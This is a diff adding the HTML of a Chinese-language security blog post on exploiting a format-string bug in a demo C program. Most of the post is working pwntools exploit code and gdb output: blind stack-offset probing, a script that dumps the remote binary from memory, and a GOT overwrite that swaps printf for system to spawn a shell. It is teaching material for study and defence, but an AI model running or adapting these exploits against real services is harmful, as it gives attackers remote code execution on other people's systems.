@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+    
+<head>
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="silence">
+    <title>silence - 格式化字符串漏洞（二）漏洞利用</title>
+    <meta name="author" content="mara silence">
+    <meta name="description" content="null">
+    <link rel="icon" href="/assets/images/null">
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/font-awesome.css">
+    <link rel="stylesheet" href="/assets/css/jquery.fancybox.css">
+    <link rel="stylesheet" href="/assets/css/jquery.fancybox-thumbs.css">
+    <link rel="stylesheet" href="/assets/css/tranquilpeak.css">
+    <!--STYLES END-->
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <header id="header">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars "></i>
+    <h1 class="header-title">
+        <a class="header-title-link" href="http://blog.jacksecurity.com">silence</a>
+    </h1>
+    
+</header>
+            <nav id="sidebar">
+    
+    <ul class="sidebar-buttons">
+        
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+                    <span class="sidebar-button-desc hide-md">Home</span>
+                </a>
+            </li>
+        
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/all-categories">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+                    <span class="sidebar-button-desc hide-md">Categories</span>
+                </a>
+            </li>
+        
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/all-tags">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+                    <span class="sidebar-button-desc hide-md">Tags</span>
+                </a>
+            </li>
+        
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/all-archives">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+                    <span class="sidebar-button-desc hide-md">Archives</span>
+                </a>
+            </li>
+        
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/#about">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+                    <span class="sidebar-button-desc hide-md">About me</span>
+                </a>
+            </li>
+        
+    </ul>
+    
+
+    <ul class="sidebar-icons">
+        
+    </ul>
+
+    <div class="links">
+        <span>Links</span>
+        <ul class="list">
+            
+                <li>
+                    
+                        <a href="http://hexo.io" target="_blank">
+                    
+                        <span class="sidebar-button-desc hide-md">Hexo</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+</nav>
+            <div id="main">
+                
+<article class="post" itemscope itemType="http://schema.org/BlogPosting">
+    
+        <div class="post-header main-content-wrap">
+    
+        <h1 class="post-title" itemprop="headline">格式化字符串漏洞（二）漏洞利用</h1>
+    
+    
+</div>
+    
+    <div class="post-content markdown main-content-wrap" itemprop="articleBody">
+        <h1 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h1><a id="more"></a>
+<h2 id="0x01-leak内存"><a href="#0x01-leak内存" class="headerlink" title="0x01 leak内存"></a>0x01 leak内存</h2><p><font color="grenn" face="黑体"></font>在上一篇文章中提到，通过”%s”可以读取任意内存。通过这种方式，在没有程序源码与bin的情况下，可以leak出程序内存，进而得到程序的bin。</p>
+<p>以以下代码为例：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> a[<span class="number">1024</span>];</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">memset</span>(a,<span class="string">'\0'</span>,<span class="number">1024</span>);</div><div class="line">        read(<span class="number">0</span>,a,<span class="number">1024</span>);</div><div class="line">        <span class="built_in">printf</span>(a);</div><div class="line">        fflush(<span class="built_in">stdout</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>假设我们不知道该程序的源码，也没有该程序的bin，只能通过远程连接访问这个应用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ nc 127.0.0.1 10000</div><div class="line">test</div><div class="line">test</div></pre></td></tr></table></figure></p>
+<p>在这种条件下就要先确定漏洞类型，如果是堆栈溢出漏洞，应该输入大量的字符测试，二格式化字符串漏洞可以测试”%x”这类格式化字符串。接下来在完全黑盒的情形下leak程序内存。</p>
+<p>在上一篇文章中，当要读或写任意内存的时，首先将地址输入，然后根据地址的栈偏移，再读写内存。当时，确定栈偏移是再在调试过<br>程中观察堆栈情况。但是现在无法调试程序，但是可以通过手动输入一串测试字符串确定栈偏移：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$nc 127.0.0.1 10000</div><div class="line">1234-%x-%x-%x-%x-%x-%x-%x-%x-%x</div><div class="line">1234-ffe122ec-400-4-4-6474e550-16ab88-34333231-2d78252d-252d7825</div></pre></td></tr></table></figure></p>
+<p>上面的字符串首先输入了”1234”，然后依次打印堆栈的内容。只要输入的内容保存在栈中，受用足够的”%x”，总能将输入的内容打印出来。可以看到在栈偏移为7的内存中存放的是”34333231”，也就是字符串”1234”。这样就确定了栈偏移值为7。<br>在Linux下，不开PIE保护时,32位的ELF的默认首地址为0x8048000，则需要根据ELF的魔术头7f 45 4c 46进行爆破，内存地址一页一页的往前翻直到翻到ELF的魔术头为止。<br>但这时候还存在一个问题:<br>比如Payload为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">premote=(<span class="string">"127.0.0.1"</span>,<span class="number">1000</span>)</div><div class="line">p.send(p32(<span class="number">0x8048000</span>)+<span class="string">"%7$s"</span>)</div></pre></td></tr></table></figure></p>
+<p>会得到EOFError错误，因为printf 根据\x00判断结尾<br>所以payload需要修改<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">premote=(<span class="string">"127.0.0.1"</span>,<span class="number">1000</span>)</div><div class="line">p.send(<span class="string">"%9$saaaa"</span>+p32(<span class="number">0x8048000</span>))</div></pre></td></tr></table></figure></p>
+<p>这样\x00就放在了末尾，这样地址的栈偏移又增加了两个栈空间，变为了9。根据这个原理，可以写完整的payload。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">f = open(<span class="string">"source.bin"</span>,<span class="string">"ab+"</span>)</div><div class="line">startAddr=<span class="number">0x8048000</span></div><div class="line">offset=<span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    r = remote(<span class="string">"127.0.0.1"</span>,<span class="number">10000</span>)</div><div class="line">    addr=startAddr+offset</div><div class="line">    r.sendline(<span class="string">"%9$saaaa"</span>+p32(addr))</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        info=r.recvuntil(<span class="string">"aaaa"</span>)[:<span class="number">-4</span>]</div><div class="line">        <span class="keyword">print</span> info</div><div class="line">    <span class="keyword">except</span> EOFError:</div><div class="line">        <span class="keyword">print</span> offset</div><div class="line">        <span class="keyword">break</span></div><div class="line">    info +=<span class="string">"\x00"</span></div><div class="line">    offset +=len(info)</div><div class="line">    r.close()</div><div class="line">    f.write(info)</div><div class="line">    f.flush()</div><div class="line">f.close()</div></pre></td></tr></table></figure></p>
+<p>另外，再本地打开监听端口并重定向子程序的输入输出可以直接使用shell命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ socat TCP4-LISTEN:10000,fork EXEC:./printf1</div></pre></td></tr></table></figure></p>
+<p>内存数据dump下来后，虽然跟原始bin有很大不同，也无法运行，但还是可以丢到ida中看。<br><img src="/image/ida_dump.png" alt="ShowImage"> </p>
+<h2 id="0x02-执行shell"><a href="#0x02-执行shell" class="headerlink" title="0x02 执行shell"></a>0x02 执行shell</h2><p><font color="green" face="黑体"></font>针对格式化字符串漏洞的攻击一般有两种方式：修改函数返回地址和修改程序某个函数的got表。修改函数返回地址需要知道栈的地址，这种方式局限性太大。常用的是修改函数got表。</p>
+<p>以上面的程序为例，由于程序是循环输入，倘若修改printf函数的got表为system函数的地址，在下次执行printf函数时实际是执行的system函数，倘若<br>输入参数为”/bin/sh”，就可以执行shell了。</p>
+<p>还是假设不知道源代码，使用leak内存而dump出的bin文件。由于是dump出来的程序，所以IDA在解析时还是存在一定问题，got表段不能直接显示，需要对照正常程序自己寻找。找到了printf的got表地址，就要将其内容改为system函数地址。system函数地址是不固定的，但对于同一个libc文件来说，system函数地址与printf函数的地址的便宜是固定的，有了printf地址可以得到system函数地址。我的libc文件中，两个函数的偏移为53088。在没有程序的libc的情况下有两种方法来确定偏移，一是在一个范围内进行爆破，二是尽可能的搜集常用linux系统的libc文件。<br>通过下面的payload，尝试执行shell：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">Debug=<span class="keyword">False</span></div><div class="line"><span class="keyword">if</span> Debug:</div><div class="line">    r=process(<span class="string">"./printf1"</span>)</div><div class="line">    gdb.attach(r)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    r=remote(<span class="string">"127.0.0.1"</span>,<span class="number">10000</span>)</div><div class="line">printf_got=<span class="number">0x804a010</span></div><div class="line"><span class="comment">#根据printf函数got表获取printf函数地址</span></div><div class="line">leak_paylod=<span class="string">"b%6$saaa"</span>+p32(printf_got)</div><div class="line">r.sendline(leak_paylod)</div><div class="line">r.recvuntil(<span class="string">"b"</span>)</div><div class="line">info=r.recvuntil(<span class="string">"aaa"</span>)[:<span class="number">-3</span>]</div><div class="line"><span class="keyword">print</span> info.encode(<span class="string">"hex"</span>)</div><div class="line"><span class="comment">#计算system函数地址</span></div><div class="line">system_addr=u32(info[<span class="number">0</span>:<span class="number">4</span>])<span class="number">-53088</span></div><div class="line"><span class="keyword">print</span> hex(system_addr)</div><div class="line"><span class="comment">#使用pwntools自带函数构造格式化字符串</span></div><div class="line">write = &#123;<span class="number">0x804a010</span>: system_addr&#125;</div><div class="line">payload=<span class="string">"aaaa"</span></div><div class="line">payload += fmtstr_payload(<span class="number">5</span>, write, len(payload), <span class="string">'byte'</span>)</div><div class="line"><span class="keyword">print</span> payload</div><div class="line">r.sendline(payload)</div><div class="line"><span class="comment">#sleep(1)</span></div><div class="line">r.recvuntil(<span class="string">"aaaa"</span>)</div><div class="line">r.sendline(<span class="string">"/bin/sh"</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure></p>
+<p>成功获取了shell，为了更清楚的看清整个过程，可以在本地进行调试。<br>第一次执行printf函数，获取prinf函数地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0xf75d6dcb:	xchg   ax,ax</div><div class="line">   0xf75d6dcd:	xchg   ax,ax</div><div class="line">   0xf75d6dcf:	nop</div><div class="line">=&gt; 0xf75d6dd0 &lt;printf&gt;:	push   ebx</div><div class="line">   0xf75d6dd1 &lt;printf+1&gt;:	sub    esp,0x18</div><div class="line">   0xf75d6dd4 &lt;printf+4&gt;:	call   0xf76afe6b</div><div class="line">   0xf75d6dd9 &lt;printf+9&gt;:	add    ebx,0x15c227</div><div class="line">   0xf75d6ddf &lt;printf+15&gt;:	lea    eax,[esp+0x24]</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffa7c59c --&gt; 0x804851d (&lt;main+80&gt;:	mov    eax,ds:0x804a040)</div><div class="line">0004| 0xffa7c5a0 --&gt; 0xffa7c5b0 (&quot;b%6$saaa\020\240\004\b\n&quot;)</div><div class="line">0008| 0xffa7c5a4 --&gt; 0xffa7c5b0 (&quot;b%6$saaa\020\240\004\b\n&quot;)</div><div class="line">0012| 0xffa7c5a8 --&gt; 0x400 </div><div class="line">0016| 0xffa7c5ac --&gt; 0x16ab88 </div><div class="line">0020| 0xffa7c5b0 (&quot;b%6$saaa\020\240\004\b\n&quot;)</div><div class="line">0024| 0xffa7c5b4 (&quot;saaa\020\240\004\b\n&quot;)</div><div class="line">0028| 0xffa7c5b8 --&gt; 0x804a010 --&gt; 0xf75d6dd0 (&lt;printf&gt;:	push   ebx)</div><div class="line">[------------------------------------------------------------------------------]</div></pre></td></tr></table></figure></p>
+<p>第二次执行printf函数，可以看到printfgot表存放的还是printf的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0xf75d6dcb:	xchg   ax,ax</div><div class="line">   0xf75d6dcd:	xchg   ax,ax</div><div class="line">   0xf75d6dcf:	nop</div><div class="line">=&gt; 0xf75d6dd0 &lt;printf&gt;:	push   ebx</div><div class="line">   0xf75d6dd1 &lt;printf+1&gt;:	sub    esp,0x18</div><div class="line">   0xf75d6dd4 &lt;printf+4&gt;:	call   0xf76afe6b</div><div class="line">   0xf75d6dd9 &lt;printf+9&gt;:	add    ebx,0x15c227</div><div class="line">   0xf75d6ddf &lt;printf+15&gt;:	lea    eax,[esp+0x24]</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffa7c59c --&gt; 0x804851d (&lt;main+80&gt;:	mov    eax,ds:0x804a040)</div><div class="line">0004| 0xffa7c5a0 --&gt; 0xffa7c5b0 (&quot;aaaa\020\240\004\b\021\240\004\b\022\240\004\b\023\240\004\b%92c%5$hhn%46c%6$hhn%190c%7$hhn%155c%8$hhn\n&quot;)</div><div class="line">0008| 0xffa7c5a4 --&gt; 0xffa7c5b0 (&quot;aaaa\020\240\004\b\021\240\004\b\022\240\004\b\023\240\004\b%92c%5$hhn%46c%6$hhn%190c%7$hhn%155c%8$hhn\n&quot;)</div><div class="line">0012| 0xffa7c5a8 --&gt; 0x400 </div><div class="line">0016| 0xffa7c5ac --&gt; 0x16ab88 </div><div class="line">0020| 0xffa7c5b0 (&quot;aaaa\020\240\004\b\021\240\004\b\022\240\004\b\023\240\004\b%92c%5$hhn%46c%6$hhn%190c%7$hhn%155c%8$hhn\n&quot;)</div><div class="line">0024| 0xffa7c5b4 --&gt; 0x804a010 --&gt; 0xf75d6dd0 (&lt;printf&gt;:	push   ebx)</div><div class="line">0028| 0xffa7c5b8 --&gt; 0x804a011 --&gt; 0xb0f75d6d </div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line"></div><div class="line">Breakpoint 1, 0xf75d6dd0 in printf () from /lib32/libc.so.6</div><div class="line">gdb-peda$ x/wx 0x804a010</div><div class="line">0x804a010 &lt;printf@got.plt&gt;:	0xf75d6dd0</div></pre></td></tr></table></figure></p>
+<p>跳出printf函数，可以看到got表里存放的已经是system函数的地址了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x8048511 &lt;main+68&gt;:	lea    eax,[esp+0x10]</div><div class="line">   0x8048515 &lt;main+72&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">   0x8048518 &lt;main+75&gt;:	call   0x8048380 &lt;printf@plt&gt;</div><div class="line">=&gt; 0x804851d &lt;main+80&gt;:	mov    eax,ds:0x804a040</div><div class="line">   0x8048522 &lt;main+85&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">   0x8048525 &lt;main+88&gt;:	call   0x8048390 &lt;fflush@plt&gt;</div><div class="line">   0x804852a &lt;main+93&gt;:	jmp    0x80484d9 &lt;main+12&gt;</div><div class="line">   0x804852c:	xchg   ax,ax</div><div class="line"></div><div class="line">gdb-peda$ x/wx 0x804a010</div><div class="line">0x804a010 &lt;printf@got.plt&gt;:	0xf75c9e70</div></pre></td></tr></table></figure></p>
+<p>接下来单步执行，看下system函数的调用过程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x804850c &lt;main+63&gt;:	call   0x8048370 &lt;read@plt&gt;</div><div class="line">   0x8048511 &lt;main+68&gt;:	lea    eax,[esp+0x10]</div><div class="line">   0x8048515 &lt;main+72&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">=&gt; 0x8048518 &lt;main+75&gt;:	call   0x8048380 &lt;printf@plt&gt;</div><div class="line">   0x804851d &lt;main+80&gt;:	mov    eax,ds:0x804a040</div><div class="line">   0x8048522 &lt;main+85&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">   0x8048525 &lt;main+88&gt;:	call   0x8048390 &lt;fflush@plt&gt;</div><div class="line">   0x804852a &lt;main+93&gt;:	jmp    0x80484d9 &lt;main+12&gt;</div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0xffa7c5b0 (&quot;/bin/sh\n&quot;)</div></pre></td></tr></table></figure></p>
+<p>进入0x8048380，可以看到程序要跳转到got表中存放的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x8048370 &lt;read@plt&gt;:	jmp    DWORD PTR ds:0x804a00c</div><div class="line">   0x8048376 &lt;read@plt+6&gt;:	push   0x0</div><div class="line">   0x804837b &lt;read@plt+11&gt;:	jmp    0x8048360</div><div class="line">=&gt; 0x8048380 &lt;printf@plt&gt;:	jmp    DWORD PTR ds:0x804a010</div><div class="line"> | 0x8048386 &lt;printf@plt+6&gt;:	push   0x8</div><div class="line"> | 0x804838b &lt;printf@plt+11&gt;:	jmp    0x8048360</div><div class="line"> | 0x8048390 &lt;fflush@plt&gt;:	jmp    DWORD PTR ds:0x804a014</div><div class="line"> | 0x8048396 &lt;fflush@plt+6&gt;:	push   0x10</div><div class="line"> |-&gt;   0xf75f2e70 &lt;system&gt;:	push   ebx</div><div class="line">       0xf75f2e71 &lt;system+1&gt;:	sub    esp,0x8</div><div class="line">       0xf75f2e74 &lt;system+4&gt;:	mov    eax,DWORD PTR [esp+0x10]</div><div class="line">       0xf75f2e78 &lt;system+8&gt;:	call   0xf76d8e6b</div><div class="line">                                                                  JUMP is take</div></pre></td></tr></table></figure></p>
+<p>继续执行，跳转到了system函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0xf75f2e6c:	pop    edi</div><div class="line">   0xf75f2e6d:	ret    </div><div class="line">   0xf75f2e6e:	xchg   ax,ax</div><div class="line">=&gt; 0xf75f2e70 &lt;system&gt;:	push   ebx</div><div class="line">   0xf75f2e71 &lt;system+1&gt;:	sub    esp,0x8</div><div class="line">   0xf75f2e74 &lt;system+4&gt;:	mov    eax,DWORD PTR [esp+0x10]</div><div class="line">   0xf75f2e78 &lt;system+8&gt;:	call   0xf76d8e6b</div><div class="line">   0xf75f2e7d &lt;system+13&gt;:	add    ebx,0x169183</div><div class="line">[------------------------------------stack-------------------------------------]</div></pre></td></tr></table></figure></p>
+<h2 id="0x03-pwntools自动构造格式化字符串"><a href="#0x03-pwntools自动构造格式化字符串" class="headerlink" title="0x03 pwntools自动构造格式化字符串"></a>0x03 pwntools自动构造格式化字符串</h2><p><font color="green" face="黑体"></font>一开始在确定栈偏移与构造格式化字符串时，都是手动去做的。实际上pwntools提供了非常方便的函数，<br>可以自动计算栈偏移与构造格式化字符串。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">    p = process(<span class="string">"./.printf1"</span>)</div><div class="line">    p.sendline(payload)</div><div class="line">    <span class="keyword">return</span> p.recvall()</div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">offset = autofmt.offset</div><div class="line">write = &#123;printf_got: system_addr&#125;</div><div class="line">p=<span class="string">""</span></div><div class="line">p += fmtstr_payload(offset, write, len(p), <span class="string">'byte'</span>)</div><div class="line"><span class="keyword">print</span> p</div></pre></td></tr></table></figure>
+<p>通过exec_fmt函数，python脚本可以自动计算栈偏移。fmtstr_payload第一个参数为栈偏移，第二个参数为一个字典。字典的key是我们要修改的地址，value是我们要写入的内容。格式化字符串如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\x10\xa0\x04\x08\x11\xa0\x04\x08\x12\xa0\x04\x08\x13\xa0\x04\x08%92c%5$hhn%190c%6$hhn%49c%7$hhn%152c%8$hhn</div></pre></td></tr></table></figure></p>
+<p>按照之前的参数构造方式，手动构造应该是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\x10\xa0\x04\x08\%‭41589674084c%$5n</div></pre></td></tr></table></figure></p>
+<p>中间的大数是system的地址0xf7e4ce70减去4。事实上，程序是无法接收这么大的数的。所以这样的格式化字符是无效的。再转过去看python脚本构造的字符串，可以发现开头连续写入了四个地址，也就是got表开始的四个字节。而”%n”这种字符串也有四个，相比与手动构造的字符串，还多了”hh”。”%hhn”的意思是向一个字节空间写入。这样一来，一个比较大的数就可以拆分为四个字节写入，也就解决了上述问题。</p>
+
+        
+            
+        
+    </div>
+    <div class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/格式化字符串/">格式化字符串</a> <a class="tag tag--primary tag--small t-link" href="/tags/漏洞/">漏洞</a>
+
+            </div>
+        
+        <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/28/栈溢出漏洞（一）shellcode/"  data-tooltip="栈溢出漏洞（一）shellcode">
+                
+                    <i class="fa fa-angle-left"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/22/格式化字符串—漏洞（一）/" data-tooltip="格式化字符串漏洞（一）漏洞原理">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    
+</div>
+
+
+        
+    </div>
+    <div class="post-bottom-bar">
+        <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/28/栈溢出漏洞（一）shellcode/"  data-tooltip="栈溢出漏洞（一）shellcode">
+                
+                    <i class="fa fa-angle-left"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/22/格式化字符串—漏洞（一）/" data-tooltip="格式化字符串漏洞（一）漏洞原理">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    
+</div>
+
+
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <div class="copyrights">
+        Copyrights &copy; 2017 mara silence. All Rights Reserved.
+        
+    </div>
+    <div class="copyrights">
+    	Powered by <a href="http://hexo.io/" target="_blank" rel="nofollow">Hexo</a>  
+    </div>
+</footer>
+
+            </div>
+        </div>
+        <div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-remove"></i>
+        </div>
+        
+            <h4 id="about-card-name">mara silence</h4>
+        
+        
+        
+    </div>
+</div>
+        <div id="cover" style="background-image:url('/assets/images/cover.png');"></div>
+    </body>
+    <!--SCRIPTS-->
+<script src="/assets/js/jquery.js"></script>
+<script src="/assets/js/jquery.fancybox.js"></script>
+<script src="/assets/js/jquery.fancybox-thumbs.js"></script>
+<script src="/assets/js/tranquilpeak.js"></script>
+<!--SCRIPTS END-->
+
+
+</html>
